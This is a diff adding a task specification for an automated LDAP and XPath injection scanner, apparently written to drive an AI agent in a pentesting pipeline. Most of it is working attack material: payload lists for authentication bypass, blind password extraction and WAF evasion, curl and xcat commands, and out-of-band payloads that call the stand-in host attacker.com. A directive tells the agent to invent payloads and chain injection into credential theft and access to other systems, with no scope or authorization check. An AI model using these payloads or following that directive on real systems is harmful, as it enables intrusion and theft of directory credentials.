@@ -1,0 +1,563 @@
+================================================================================
+TASK 49 — LDAP & XPATH INJECTION SCANNER
+================================================================================
+Covers testing_toolkit.txt Step 14 (LDAP/XPath portions)
+NoSQL already handled by Task 45
+
+OBJECTIVE
+─────────
+Identify LDAP injection and XPath injection vulnerabilities in:
+- Enterprise login/search forms (LDAP)
+- XML-based applications, SOAP APIs (XPath)
+- Directory service integrations
+- SAML/SSO implementations
+
+================================================================================
+                              INPUT FILES
+================================================================================
+PRIMARY (high-priority targets):
+  outputs/queue_dynamic_endpoints_urls.txt    ← params to inject
+  outputs/arjun_found_params.txt              ← discovered hidden params
+  outputs/api_endpoints_live.txt              ← authenticated API routes
+
+SECONDARY (broaden coverage):
+  outputs/har/common_data.txt                 ← HAR-extracted endpoints
+  outputs/live_base_urls.txt                  ← base URLs for discovery
+
+INTELLIGENCE (adaptive testing):
+  outputs/waf_summary.json                    ← WAF bypass selection
+  outputs/nuclei/tech_stack.json              ← tech stack detection
+
+================================================================================
+                             OUTPUT FILES
+================================================================================
+outputs/ldap_xpath/
+├── ldap_injection_findings.json      ← confirmed LDAP injection vulns
+├── xpath_injection_findings.json     ← confirmed XPath injection vulns
+├── ldap_candidates.txt               ← likely LDAP endpoints (for manual)
+├── xpath_candidates.txt              ← likely XPath endpoints (for manual)
+├── scan_log.txt                      ← full execution log
+└── checkpoint.json                   ← resume state
+
+================================================================================
+                         LDAP INJECTION OVERVIEW
+================================================================================
+LDAP (Lightweight Directory Access Protocol) injection occurs when user input
+is inserted into LDAP queries without proper sanitization.
+
+COMMON LDAP TARGETS:
+────────────────────
+- Login forms (username field)
+- User search/lookup functionality
+- Employee directories
+- Active Directory integrations
+- LDAP-based authentication
+- Certificate lookup services
+
+LDAP-LIKELY PARAMETER NAMES:
+────────────────────────────
+username, user, uid, cn, sn, mail, email, dn, ou, dc, samaccountname,
+userprincipalname, memberof, objectclass, filter, search, query, ldap,
+directory, ad, account, login, name, firstname, lastname, department,
+manager, employee, staff, person
+
+================================================================================
+                         LDAP INJECTION PAYLOADS
+================================================================================
+
+SECTION 1: AUTHENTICATION BYPASS
+────────────────────────────────
+# Basic wildcard bypass
+*
+*)(uid=*)
+*)(uid=*))
+*))%00
+
+# NULL injection (terminate query)
+admin)(|(password=*
+admin)(&)
+admin)(objectClass=*
+user))(|(objectClass=*
+
+# Always-true conditions
+*)(objectClass=*
+*)(cn=*
+*)|(&)
+*))(|(uid=*
+
+SECTION 2: INFORMATION DISCLOSURE
+─────────────────────────────────
+# Extract user attributes
+*)(|(mail=*
+*)(|(cn=*
+*)(|(sn=*
+*)(|(telephoneNumber=*
+*)(|(description=*
+
+# Enumerate users
+a*)(|(uid=*
+b*)(|(uid=*
+admin*)(|(uid=*
+
+# Extract group membership
+*)(|(memberOf=*
+*)(|(member=*
+
+SECTION 3: BLIND LDAP INJECTION
+───────────────────────────────
+# Character-by-character extraction
+admin*)(uid=a*
+admin*)(uid=b*
+admin*)(password=a*
+admin*)(password=b*
+
+# Boolean-based detection
+*)(uid=admin)(|(uid=*          ← true if admin exists
+*)(uid=nonexistent)(|(uid=*    ← false (baseline)
+
+# Time-based (if supported)
+*)(uid=admin)(objectClass=top)(objectClass=person)(|(uid=*
+
+SECTION 4: FILTER MANIPULATION
+──────────────────────────────
+# Inject additional filters
+)(cn=*
+)(uid=*
+)(objectClass=*
+))(|(objectClass=*
+
+# Escape sequence attacks
+\00                            ← NULL byte
+\2a                            ← asterisk (*)
+\28                            ← open paren
+\29                            ← close paren
+\5c                            ← backslash
+
+SECTION 5: LDAP OPERATOR ABUSE
+──────────────────────────────
+# AND operator injection
+)(&)(uid=*
+)(!(uid=nonexistent)
+
+# OR operator injection
+)(|(uid=*
+)(|(cn=*
+
+# NOT operator injection
+)(!(objectClass=nonexistent)
+)(!(uid=)
+
+================================================================================
+                         XPATH INJECTION OVERVIEW
+================================================================================
+XPath injection occurs when user input is inserted into XPath queries used
+to navigate XML documents.
+
+COMMON XPATH TARGETS:
+─────────────────────
+- XML data stores
+- SOAP web services
+- REST APIs returning/processing XML
+- SAML authentication
+- Configuration file parsing
+- Document management systems
+- Search functionality over XML data
+
+XPATH-LIKELY PARAMETER NAMES:
+─────────────────────────────
+xpath, xml, path, node, element, query, search, id, name, user, username,
+login, password, filter, select, where, value, attribute, tag, document
+
+================================================================================
+                         XPATH INJECTION PAYLOADS
+================================================================================
+
+SECTION 6: AUTHENTICATION BYPASS
+────────────────────────────────
+# Classic OR injection
+' or '1'='1
+' or ''='
+" or "1"="1
+" or ""="
+' or 1=1 or ''='
+" or 1=1 or ""="
+
+# Closing bracket injection
+'] | //* | /foo[bar='
+') or ('1'='1
+") or ("1"="1
+
+# Comment injection (if supported)
+' or '1'='1' --
+' or '1'='1' #
+
+SECTION 7: INFORMATION EXTRACTION
+─────────────────────────────────
+# Extract all nodes
+' or 1=1]/parent::*/child::*[''='
+' | //* | '
+' | //user/* | '
+' | //password | '
+
+# Navigate to root
+' or name()='
+' | /* | '
+' | //* | '
+
+# Extract node names
+' or name()='user
+' or name()='password
+' or name()='admin
+
+SECTION 8: BLIND XPATH INJECTION
+────────────────────────────────
+# Boolean-based extraction
+' or substring(//user/password,1,1)='a
+' or substring(//user/password,1,1)='b
+' or string-length(//user/password)>5
+' or string-length(//user/password)>10
+
+# Character-by-character
+' or substring(name(/*),1,1)='a' and ''='
+' or substring(name(/*[1]),1,1)='a' and ''='
+
+# Count-based
+' or count(//user)>0 and ''='
+' or count(//user)=1 and ''='
+
+SECTION 9: XPATH 2.0 SPECIFIC
+─────────────────────────────
+# If XPath 2.0 is supported
+' or doc('http://attacker.com/xxe.xml') and ''='
+' or unparsed-text('file:///etc/passwd') and ''='
+
+# String functions
+' or matches(//password,'.*') and ''='
+' or contains(//password,'admin') and ''='
+
+SECTION 10: OPERATOR ABUSE
+──────────────────────────
+# Logical operators
+' and '1'='1
+' and ''='
+" and "1"="1
+' or not('1'='2') and ''='
+
+# Comparison operators
+' or 1<2 and ''='
+' or 1>0 and ''='
+' or 1!=0 and ''='
+
+================================================================================
+                           WAF BYPASS TECHNIQUES
+================================================================================
+
+SECTION 11: ENCODING BYPASSES
+─────────────────────────────
+# URL encoding
+%27%20or%20%271%27%3D%271          ← ' or '1'='1
+%2a%29%28%7c%28uid%3d%2a           ← *)(|(uid=*
+
+# Double URL encoding
+%252a%2529%2528                    ← *)(
+
+# Unicode encoding
+\u0027 or \u00271\u0027=\u00271    ← ' or '1'='1
+\x27 or \x271\x27=\x271            ← hex variant
+
+# HTML entities
+&#39; or &#39;1&#39;=&#39;1        ← ' or '1'='1
+&#x27; or &#x27;1&#x27;=&#x27;1   ← hex HTML
+
+SECTION 12: CASE & WHITESPACE
+─────────────────────────────
+# Case variations
+' OR '1'='1
+' oR '1'='1
+' Or '1'='1
+
+# Alternative whitespace
+'%09or%09'1'='1                    ← tab
+'%0aor%0a'1'='1                    ← newline
+'%0cor%0c'1'='1                    ← form feed
+'/**/or/**/'1'='1                  ← SQL-style comments
+
+SECTION 13: STRING CONCATENATION
+────────────────────────────────
+# XPath concat
+' or concat('1','')='1' and ''='
+' or string('1')='1' and ''='
+
+# Split injection
+'+'or+'1'='1
+'||'or'||'1'='1
+
+================================================================================
+                              TOOL COMMANDS
+================================================================================
+
+LDAP INJECTION TESTING (Custom Scripts Required):
+─────────────────────────────────────────────────
+No mature CLI tool exists for LDAP injection. Use custom Python with:
+
+# Basic injection test
+curl -s "https://target.com/login" \
+  -d "username=*)(uid=*)&password=test" \
+  --proxy http://127.0.0.1:8080
+
+# With authentication
+curl -s "https://target.com/search" \
+  -H "Cookie: session=xxx" \
+  -d "query=*)(cn=*" \
+  --proxy http://127.0.0.1:8080
+
+XPATH INJECTION TESTING:
+────────────────────────
+# XCat - XPath injection tool
+xcat detect --url="https://target.com/search?query=INJECT"
+xcat run --url="https://target.com/search?query=INJECT" \
+         --method=GET \
+         --true-string="found" \
+         --oob-http="http://attacker.com/"
+
+# XPath error-based
+curl -s "https://target.com/api" \
+  -H "Content-Type: application/xml" \
+  -d '<search><query>'\'' or '\''1'\''='\''1</query></search>'
+
+================================================================================
+                        DETECTION SIGNATURES
+================================================================================
+
+LDAP ERROR SIGNATURES (indicates injectable):
+─────────────────────────────────────────────
+- "Invalid DN syntax"
+- "ldap_search"
+- "Bad search filter"
+- "Error in filter"
+- "Invalid filter"
+- "javax.naming.NamingException"
+- "com.sun.jndi.ldap"
+- "LDAPException"
+- "LDAP error"
+- "Search filter is invalid"
+- "error:0x"
+- "error 0x"
+
+XPATH ERROR SIGNATURES (indicates injectable):
+──────────────────────────────────────────────
+- "XPathException"
+- "Invalid XPath"
+- "XPath syntax error"
+- "javax.xml.xpath"
+- "XPathEvalError"
+- "SimpleXMLElement::xpath"
+- "DOMXPath"
+- "XPATH syntax error"
+- "Invalid expression"
+- "xmlXPathEval"
+- "xpath.evaluate"
+- "XPath error"
+
+BEHAVIOR-BASED DETECTION:
+─────────────────────────
+- Different response length with ' vs normal input
+- Different response time (blind injection)
+- Different HTTP status code
+- Additional data returned (OR injection success)
+- Error message differences
+
+================================================================================
+                     TARGET IDENTIFICATION HEURISTICS
+================================================================================
+
+HIGH-PRIORITY LDAP TARGETS:
+───────────────────────────
+1. Login forms with "username" field (not email-based)
+2. Employee/staff directory search
+3. "Forgot password" with username lookup
+4. Certificate/key lookup services
+5. Any endpoint with "ldap", "directory", "ad" in path/params
+6. Enterprise applications (especially Java/.NET)
+7. SSO/SAML implementations
+8. Corporate intranets
+
+HIGH-PRIORITY XPATH TARGETS:
+────────────────────────────
+1. SOAP web services
+2. Endpoints accepting XML input
+3. Search functionality over structured data
+4. Document/content management systems
+5. Endpoints with "xml", "xpath", "node" in params
+6. SAML authentication flows
+7. REST APIs with XML content-type
+8. Configuration/settings endpoints
+
+================================================================================
+                         EXECUTION WORKFLOW
+================================================================================
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 1: Load & Classify Targets                                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Load queue_dynamic_endpoints_urls.txt                                     │
+│ • Load api_endpoints_live.txt                                               │
+│ • Identify LDAP-likely endpoints (login, search, directory)                 │
+│ • Identify XPath-likely endpoints (XML, SOAP, xpath params)                 │
+│ • Check tech_stack.json for tech hints (Java/.NET = LDAP likely)            │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 2: LDAP Injection Testing                                              │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ FOR each LDAP candidate:                                                    │
+│   a) Send baseline request (normal input)                                   │
+│   b) Send wildcard probe: *                                                 │
+│   c) Send bypass probe: *)(uid=*)                                           │
+│   d) Check for LDAP error signatures                                        │
+│   e) Compare response length/content                                        │
+│   f) If injectable → log + attempt blind extraction                         │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 3: XPath Injection Testing                                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ FOR each XPath candidate:                                                   │
+│   a) Send baseline request (normal input)                                   │
+│   b) Send quote probe: '                                                    │
+│   c) Send OR bypass: ' or '1'='1                                            │
+│   d) Check for XPath error signatures                                       │
+│   e) Compare response length/content                                        │
+│   f) If injectable → run XCat for extraction                                │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 4: Blind Injection Testing                                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ FOR endpoints with response differences but no errors:                      │
+│   a) Boolean-based: true/false condition comparison                         │
+│   b) Time-based: measure response delays                                    │
+│   c) Character extraction: substring-based blind                            │
+│   d) Use OOB if available (XPath 2.0 doc() function)                        │
+└─────────────────────────────────────────────────────────────────────────────┘
+                                    ↓
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ STEP 5: Output & Report                                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ • Write ldap_injection_findings.json                                        │
+│ • Write xpath_injection_findings.json                                       │
+│ • Write candidates lists for manual testing                                 │
+│ • Generate severity ratings                                                 │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+                     AI AGENT CREATIVITY DIRECTIVE
+================================================================================
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                          🧠 USE YOUR BRAIN 🧠                               │
+├─────────────────────────────────────────────────────────────────────────────┤
+│ The payloads above are STARTING POINTS, not an exhaustive list.             │
+│                                                                             │
+│ You are an intelligent agent. When testing:                                 │
+│                                                                             │
+│ 1. OBSERVE response patterns and adapt payloads accordingly                 │
+│ 2. COMBINE techniques (encoding + injection + operators)                    │
+│ 3. INVENT new payloads based on target behavior                             │
+│ 4. CHAIN vulnerabilities (LDAP injection → credential theft)                │
+│ 5. THINK about application context (what would LDAP query look like?)       │
+│                                                                             │
+│ If you discover the application uses a specific LDAP implementation         │
+│ (OpenLDAP, Active Directory, etc.), research its specific quirks.           │
+│                                                                             │
+│ Trust your analysis. Create custom payloads. Be creative.                   │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+DYNAMIC PAYLOAD GENERATION (AI BRAIN FEATURES):
+───────────────────────────────────────────────
+The Python brain (ldap_xpath_scanner.py) includes DynamicPayloadGenerator with:
+
+1. CONTEXT-AWARE GENERATION
+   - Analyzes parameter name → generates relevant payloads
+   - username/login params → auth bypass focus
+   - search/query params → data extraction focus
+   - Adapts to detected WAF type
+
+2. ADAPTIVE LEARNING
+   - Tracks successful payloads → prioritizes similar patterns
+   - Tracks blocked payloads → avoids wasting requests
+   - Learns error patterns → generates error-based variants
+
+3. BLIND EXTRACTION ENGINE
+   - Binary search for string length detection
+   - Character-by-character extraction
+   - Optimized charset (by frequency) for speed
+   - XPath substring() and string-length() techniques
+
+4. WAF BYPASS GENERATOR
+   - URL encoding chains (single, double)
+   - Case variations (OR, Or, oR)
+   - Whitespace mutations (tab, newline, double space)
+   - Unicode escapes for LDAP special chars
+   - Comment injection for XPath 2.0
+
+THINK LIKE THE DEVELOPER:
+─────────────────────────
+LDAP Query Construction (what you're breaking):
+  (&(uid={USER_INPUT})(password={PASS_INPUT}))
+  
+If you inject: *)(uid=*)
+Query becomes: (&(uid=*)(uid=*))(password=test))
+               ↑ this matches everything
+
+XPath Query Construction (what you're breaking):
+  //users/user[username='{USER_INPUT}' and password='{PASS_INPUT}']
+  
+If you inject: ' or '1'='1
+Query becomes: //users/user[username='' or '1'='1' and password='xxx']
+               ↑ this is always true
+
+CREATIVE TECHNIQUES TO TRY:
+───────────────────────────
+1. LDAP: If wildcard (*) is blocked, try character ranges: [a-z]*
+2. LDAP: Try objectClass enumeration to find interesting object types
+3. LDAP: Use !(negation) to find records NOT matching criteria
+4. XPath: Try ancestor/descendant axes: ancestor::*, descendant::*
+5. XPath: Use position() and last() for enumeration: [position()=1]
+6. XPath: Try XPath 2.0 functions if 1.0 payloads fail: matches(), tokenize()
+7. Both: If direct injection fails, try HTTP Parameter Pollution
+8. Both: Try null byte termination: payload%00
+9. Both: Try CRLF injection to break out of context: payload%0d%0a
+
+================================================================================
+                              CHECKPOINT/RESUME
+================================================================================
+checkpoint.json format:
+{
+  "last_target_index": 150,
+  "ldap_completed": ["url1", "url2"],
+  "xpath_completed": ["url3", "url4"],
+  "findings_count": {"ldap": 2, "xpath": 1},
+  "timestamp": "2026-01-13T10:30:00Z"
+}
+
+Resume: Load checkpoint, skip completed targets, continue from last_target_index
+
+================================================================================
+                             9-MINUTE BATCHING
+================================================================================
+- Process 50 LDAP candidates per batch
+- Process 50 XPath candidates per batch
+- Write outputs after each batch
+- Checkpoint every batch
+- Total timeout: 8 minutes active scanning + 1 minute output writing
+
+================================================================================
+                                  NOTES
+================================================================================
+- LDAP injection is RARE but HIGH IMPACT (often = full directory access)
+- XPath injection is RARE but can leak entire XML document contents
+- Both require specific application architecture (not all apps use LDAP/XML)
+- Error-based detection is most reliable for initial discovery
+- Blind injection requires patience and methodical character extraction
+- Consider chaining: LDAP creds → other system access
+================================================================================
